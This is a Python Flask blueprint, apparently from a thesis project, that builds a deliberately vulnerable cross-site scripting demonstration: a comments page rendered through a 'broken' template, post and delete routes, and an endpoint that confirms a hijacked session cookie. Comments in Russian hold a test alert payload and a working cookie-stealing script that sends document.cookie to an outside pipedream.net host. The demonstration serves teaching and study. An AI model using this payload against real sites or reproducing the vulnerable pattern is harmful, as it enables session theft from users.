from logging import getLogger
from flask.views import MethodView
from flask import Blueprint, render_template, url_for, redirect, jsonify
from flask_security import current_user, login_required
from blueprints.forms import PostForm


from models import Post

logger = getLogger("THESIS")

xss_bp = Blueprint(
                        'xss', __name__,
                        url_prefix='/',
                        template_folder="templates",
                        static_folder='static',
                        static_url_path='xss/static'
                    )

class XSSDemostration(MethodView):

    methods = ['GET']
    
    @login_required
    def get(self):
        post_form = PostForm()
        comments = Post.get_all() or []
        return render_template("broken_comments.html", form = post_form, comments = comments)

# Тестировщик Владислав
# Тест <script>alert("XSS IS REAL?")</script>

# Этап эксплуатации
# XSS DEMONSTRATION <script> var i=new Image(); i.src="https://enm3vddkwx8b.x.pipedream.net/?"+document.cookie; </script>

class XSSPost(MethodView):

    methods = ['POST']
    
    @login_required
    def post(self):
        post_form = PostForm()
        if post_form.validate_on_submit():
            data = post_form.to_dict()
            data['user_id'] = current_user.id
            post = Post(**data)
            post.save_to_db()
        return redirect(url_for('xss.xss_index'))
    
class XSSPostDelete(MethodView):

    methods = ['POST']

    """
        HTML5 form have methods GET&POST -- HTTP method used to submit the form
        can't use http delete method ;c
    """

    @login_required
    def post(self):
        Post.remove_all_by_user_id(user_id= current_user.id)
        return redirect(url_for('xss.xss_index'))

class XSSCheck(MethodView):

    methods = ['POST']

    def post(self):
        if not current_user.is_anonymous:
            return jsonify(current_user.to_dict())
        return jsonify(message = "Incorrect cookie?")

index_xss = XSSDemostration.as_view('xss_index')
post_xss = XSSPost.as_view('xss_post')
delete_xss = XSSPostDelete.as_view('xss_post_delete')
check_xss = XSSCheck.as_view('xss_check')

xss_bp.add_url_rule("/xss/", view_func=index_xss)
xss_bp.add_url_rule("/xss/post", view_func=post_xss)
xss_bp.add_url_rule("/xss/post/delete", view_func=delete_xss)
xss_bp.add_url_rule("/xss/check", view_func=check_xss)